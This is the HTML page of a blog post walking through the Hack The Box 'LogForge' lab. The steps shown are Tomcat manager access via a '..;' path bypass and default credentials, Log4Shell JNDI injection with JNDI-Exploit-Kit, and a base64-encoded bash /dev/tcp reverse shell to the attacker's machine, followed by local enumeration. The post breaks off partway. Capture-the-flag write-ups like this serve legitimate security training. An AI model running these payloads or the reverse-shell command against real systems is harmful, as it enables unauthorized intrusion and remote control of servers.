@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB LogForge Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB LogForge Write-up" />
+<meta name="description" content="A write-up for the LogForge box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-logforge-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB LogForge Write-up">
+  <meta property="og:description" content="A write-up for the LogForge box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-03-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-16T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB LogForge Write-up">
+  <meta name="twitter:description" content="A write-up for the LogForge box.">
+
+
+
+
+  <meta itemprop="name" content="HTB LogForge Write-up">
+  <meta itemprop="description" content="A write-up for the LogForge box.">
+  <meta itemprop="datePublished" content="2025-03-16T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-03-16T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1628">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB LogForge Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-03-16'>
+      16 Mar, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>Starting off with our <code>nmap</code> scan with scripts and service detection enabled on all ports</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.138 -oA Scans/logforge_all
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 10:32 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.138
+</span></span><span style="display:flex;"><span>Host is up (0.019s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65531 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE    VERSION
+</span></span><span style="display:flex;"><span>21/tcp   filtered ftp
+</span></span><span style="display:flex;"><span>22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
+</span></span><span style="display:flex;"><span>|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span style="display:flex;"><span>|_http-title: Ultimate Hacking Championship
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>8080/tcp filtered http-proxy
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 16.98 seconds
+</span></span></code></pre></div><p>Navigating to the website and it&rsquo;s a pretty bare page
+<img src="images/LogForge/website.png" alt="Website"></p>
+<p>Running a <code>gobuster</code> scan reveals some interesting directories</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://10.10.11.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.0.1
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:            http://10.10.11.138
+</span></span><span style="display:flex;"><span>[+] Threads:        300
+</span></span><span style="display:flex;"><span>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span style="display:flex;"><span>[+] User Agent:     gobuster/3.0.1
+</span></span><span style="display:flex;"><span>[+] Timeout:        10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2025/03/16 10:36:59 Starting gobuster
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/images (Status: 302)
+</span></span><span style="display:flex;"><span>/admin (Status: 403)
+</span></span><span style="display:flex;"><span>/manager (Status: 403)
+</span></span></code></pre></div><p>Trying to access port 8080 just results in it timing out. Let&rsquo;s look what verbs the server accepts</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$curl -i -X OPTIONS http://10.10.11.138/
+</span></span><span style="display:flex;"><span>HTTP/1.1 200
+</span></span><span style="display:flex;"><span>Date: Sun, 16 Mar 2025 14:43:03 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>Allow: GET, HEAD, POST, OPTIONS
+</span></span><span style="display:flex;"><span>Content-Length: 0
+</span></span></code></pre></div><p>We try different HTTP verbs, but no luck. Running another <code>gobuster</code> scan with a different wordlist finds another directory <code>/server-status</code>. If we enter a directory that doesn&rsquo;t exist, we can see that this is Apache Tomcat 9.0.31
+<img src="images/LogForge/tomcat.png" alt="Tomcat"></p>
+<p>That would explain the <code>/manager</code> page. Looking back at our <code>nmap</code> scan, FTP is in a filtered state, and when I attempt to access it with <code>telnet</code> I just get a connection timeout.</p>
+<p>Going back to the website, we know that if we can somehow get access to the manager page, we may be able to brute-force credentials and log in which will give us a good chance of gaining initial access. But we keep getting a 403 response. The way we get passed this is a parsing bypass that was discussed in a BlackHat presentation by <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">Orange Tsai</a>. We can format the URL like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://10.10.11.138/fake/..;/manager/
+</span></span></span></code></pre></div><p>The way this works is that Apache processes this as three directories, but Tomcat processes this as just <code>/manager</code>, so we are able to bypass rules looking for just access to <code>/manager</code> on the Apache end, and then Tomcat normalizes this to just <code>/manager</code> allowing us to access it!</p>
+<p>It goes through and the server asks us for credentials!
+<img src="images/LogForge/bypass.png" alt="Bypass"></p>
+<p>We try the basic credentials of <code>tomcat:tomcat</code> and we get in!
+<img src="images/LogForge/auth.png" alt="Authenticated"></p>
+<p>We see something interesting in <code>/UHC/{BadWayToBlockTomcat}</code>. We try to deploy a <code>.war</code> file, but receive an error</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>FAIL - Deploy Upload Failed, Exception: [org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.]
+</span></span></code></pre></div><p>This box was released around the time that <code>Log4Shell</code> was a huge vulnerability, so it makes sense to look for it. We need to listen on our localhost and plug in the standard <code>log4j</code> payload of <code>${jndi:ldap://ATTACKERCONTROLLEDHOST}</code>. Playing around with different requests, eventually we stumble upon the <code>Expire sessions</code> function for the <code>/UHC/{BadWayToBlockTomcat}</code> directory
+<img src="images/LogForge/expire.png" alt="Expire Sessions"></p>
+<p>We set Burp to intercept requests and find a parameter that we can inject our payload with</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /fake/..;/manager/html/expire?path=/UHC%7BBadWayToBlockTomcat%7D <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.138</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.138</span>
+</span></span><span style="display:flex;"><span>Authorization<span style="color:#f92672">:</span> <span style="color:#ae81ff">Basic dG9tY2F0OnRvbWNhdA==</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.138/fake/..;/manager/html/reload?path=/UHC%7BBadWayToBlockTomcat%7D</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=EED0E6EC43D2B5DA174A07A817CADDDD</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idle=${jndi:ldap://10.10.14.51:9999}
+</span></span></code></pre></div><p>And we get a call back to our listener</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>listening on [any] 9999 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.138] 43228
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span> `
+</span></span></code></pre></div><p>I&rsquo;m doing this box in 2025, so every other walkthrough does NOT work. This is how you can still get a shell. A huge thank you to <code>tratond01</code> from his comment on the forums <a href="https://forum.hackthebox.com/t/logforge-help/251219/5">here</a>. First I downloaded and activated Java 11. Then I started a <code>nc</code> listener</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">9999</span>
+</span></span></code></pre></div><p>Then we use the <a href="https://github.com/pimps/JNDI-Exploit-Kit">JNDI-Exploit-Kit</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$jdk8u442-b06/bin/java -jar JNDI-Exploit-Kit/target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -P ~/CPTS_Prep/LogForge/rev.ser -L 10.10.14.51:1389
+</span></span></code></pre></div><p>Ignore the file <code>rev.ser</code> as this was me testing a pre-serialized file as shown by most of the walkthroughs. We aren&rsquo;t going to use that, we are going to manually construct a link which you&rsquo;ll see the format when the exploit kit starts up</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Serialized payloads support Dynamic Command inputs in the following format:
+</span></span><span style="display:flex;"><span>    ldap://10.10.14.51:1389/serial/[payload_name]/exec_global/[base64_command]
+</span></span><span style="display:flex;"><span>    ldap://10.10.14.51:1389/serial/[payload_name]/exec_unix/[base64_command]
+</span></span><span style="display:flex;"><span>    ldap://10.10.14.51:1389/serial/[payload_name]/exec_win/[base64_command]
+</span></span><span style="display:flex;"><span>    ldap://10.10.14.51:1389/serial/[payload_name]/sleep/[miliseconds]
+</span></span><span style="display:flex;"><span>    ldap://10.10.14.51:1389/serial/[payload_name]/java_reverse_shell/[ipaddress:port]
+</span></span><span style="display:flex;"><span>    ldap://10.10.14.51:1389/serial/[payload_name]/dns/[domain_name]
+</span></span><span style="display:flex;"><span>    Example1: ldap://127.0.0.1:1389/serial/CommonsCollections5/exec_unix/cGluZyAtYzEgZ29vZ2xlLmNvbQ==
+</span></span><span style="display:flex;"><span>    Example2: ldap://127.0.0.1:1389/serial/Hibernate1/exec_win/cGluZyAtYzEgZ29vZ2xlLmNvbQ==
+</span></span><span style="display:flex;"><span>    Example3: ldap://127.0.0.1:1389/serial/Jdk7u21/java_reverse_shell/127.0.0.1:9999
+</span></span><span style="display:flex;"><span>    Example4: ldap://127.0.0.1:1389/serial/ROME/sleep/30000
+</span></span><span style="display:flex;"><span>    Example5: ldap://127.0.0.1:1389/serial/URLDNS/dns/sub.mydomain.com
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>Our payload is going to have to have some encoded characters and will look like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$echo -n <span style="color:#e6db74">&#34;bash -c &#39;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.51/9999; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#39;&#34;</span> | base64 -w <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>YmFzaCAtYyAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC41MS85OTk5OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTYn
+</span></span></code></pre></div><p>Now we are going to have to URL encode that in Burp so the request will look like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /fake/..;/manager/html/expire?path=/UHC%7BBadWayToBlockTomcat%7D <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.138</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">178</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.138</span>
+</span></span><span style="display:flex;"><span>Authorization<span style="color:#f92672">:</span> <span style="color:#ae81ff">Basic dG9tY2F0OnRvbWNhdA==</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.11.138/fake/..;/manager/html/expire?path=/UHC%7BBadWayToBlockTomcat%7D</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">JSESSIONID=EED0E6EC43D2B5DA174A07A817CADDDD</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idle=${jndi:ldap://10.10.14.51:1389/serial/CommonsCollections5/exec_unix/YmFzaCAtYyAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC41MS85OTk5OyBzaCA8JjE5NiA%252bJjE5NiAyPiYxOTYn}
+</span></span></code></pre></div><p>Finally, you should get a call back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nvlp <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>listening on [any] 9999 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.138] 43396
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>tomcat
+</span></span></code></pre></div><p>Upgrade our shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>/bin/sh -i
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can&#39;t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>Script started, file is /dev/null
+</span></span><span style="display:flex;"><span>tomcat@LogForge:/var/lib/tomcat9$ ^Z
+</span></span><span style="display:flex;"><span>[1]+  Stopped                 nc -nvlp 9999
+</span></span><span style="display:flex;"><span>┌─[✗]─[jsmooth@parrot]─[~/CPTS_Prep/LogForge]
+</span></span><span style="display:flex;"><span>└──╼ $stty raw -echo; fg
+</span></span><span style="display:flex;"><span>nc -nvlp 9999
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>tomcat@LogForge:/var/lib/tomcat9$
+</span></span></code></pre></div><p>Finally, we can grab the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tomcat@LogForge:/home/htb$ cat user.txt
+</span></span><span style="display:flex;"><span>f1757e8760432d67cc71e6d014d8028d
+</span></span></code></pre></div><p>Remember we saw FTP filtered? Let&rsquo;s try to access it now</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tomcat@LogForge:/dev/shm$ ftp 127.0.0.1
+</span></span><span style="display:flex;"><span>Connected to 127.0.0.1.
+</span></span><span style="display:flex;"><span>220 Welcome to the FTP-Server
+</span></span><span style="display:flex;"><span>Name (127.0.0.1:tomcat): anonymous
+</span></span><span style="display:flex;"><span>530 Not logged in
+</span></span><span style="display:flex;"><span>Login failed.
+</span></span><span style="display:flex;"><span>Remote system type is FTP.
+</span></span><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>200 Command OK
+</span></span><span style="display:flex;"><span>125 Opening ASCII mode data connection for file list.
+</span></span><span style="display:flex;"><span>.profile
+</span></span><span style="display:flex;"><span>.ssh
+</span></span><span style="display:flex;"><span>snap
+</span></span><span style="display:flex;"><span>ftpServer-1.0-SNAPSHOT-all.jar
+</span></span><span style="display:flex;"><span>.bashrc
+</span></span><span style="display:flex;"><span>.selected_editor
+</span></span><span style="display:flex;"><span>run.sh
+</span></span><span style="display:flex;"><span>.lesshst
+</span></span><span style="display:flex;"><span>.bash_history
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>.viminfo
+</span></span><span style="display:flex;"><span>.cache
+</span></span><span style="display:flex;"><span>226 Transfer complete.
+</span></span></code></pre></div><p>If we try to get any of the files we get a permission denied.</p>
+<p>If we run our favorite <code>ps -ef --forest</code> command, we will see what looks like a cronjob that is running a <code>jar</code> file that has something to do with the FTP service</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root         792       1  0 14:25 ?        00:00:00 /usr/sbin/cron -f
+</span></span><span style="display:flex;"><span>root         962     792  0 14:26 ?        00:00:00  \_ /usr/sbin/CRON -f
+</span></span><span style="display:flex;"><span>root         969     962  0 14:26 ?        00:00:00      \_ /bin/sh -c /root/run.sh
+</span></span><span style="display:flex;"><span>root         970     969  0 14:26 ?        00:00:00          \_ /bin/bash /root/run.sh
+</span></span><span style="display:flex;"><span>root         971     970  0 14:26 ?        00:00:29              \_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
+</span></span><span style="display:flex;"><span>daemon       801       1  0 14:25 ?        00:00:00 /usr/sbin/atd -f
+</span></span><span style="display:flex;"><span>tomcat       821       1  1 14:25 ?        00:05:03 /usr/lib/jvm/default-java/bin/java -DnoOp -Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true -Djava.util.
+</span></span><span style="display:flex;"><span>tomcat     11451     821  0 20:36 ?        00:00:00  \_ /bin/sh -c bash -c &#39;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.51/9999; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#39;
+</span></span><span style="display:flex;"><span>tomcat     11453   11451  0 20:36 ?        00:00:00      \_ bash -c 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.51/9999; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+</span></span><span style="display:flex;"><span>tomcat     11454   11453  0 20:36 ?        00:00:00          \_ sh
+</span></span><span style="display:flex;"><span>tomcat     11677   11454  0 20:45 ?        00:00:00              \_ /bin/bash
+</span></span><span style="display:flex;"><span>tomcat     11678   11677  0 20:45 ?        00:00:00                  \_ /bin/sh -i
+</span></span><span style="display:flex;"><span>tomcat     11704   11678  0 20:46 ?        00:00:00                      \_ script /dev/null -c bash
+</span></span><span style="display:flex;"><span>tomcat     11705   11704  0 20:46 pts/0    00:00:00                          \_ sh -c bash
+</span></span><span style="display:flex;"><span>tomcat     11706   11705  0 20:46 pts/0    00:00:00                              \_ bash
+</span></span><span style="display:flex;"><span>tomcat     30489   11706  0 21:08 pts/0    00:00:00                                  \_ ps -ef --forest
+</span></span><span style="display:flex;"><span>root         824       1  0 14:25 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>If we do a <code>locate</code> for the file, we will find it in the root directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>tomcat@LogForge:/var/lib/tomcat9$ locate ftpServer-1.0-SNAPSHOT-all.jar
+</span></span><span style="display:flex;"><span>locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 1183.3 days)
+</span></span><span style="display:flex;"><span>/ftpServer-1.0-SNAPSHOT-all.jar
+</span></span><span style="display:flex;"><span>/root/ftpServer-1.0-SNAPSHOT-all.jar
+</span></span></code></pre></div><p>Let&rsquo;s transfer it over to try to take it apart</p>
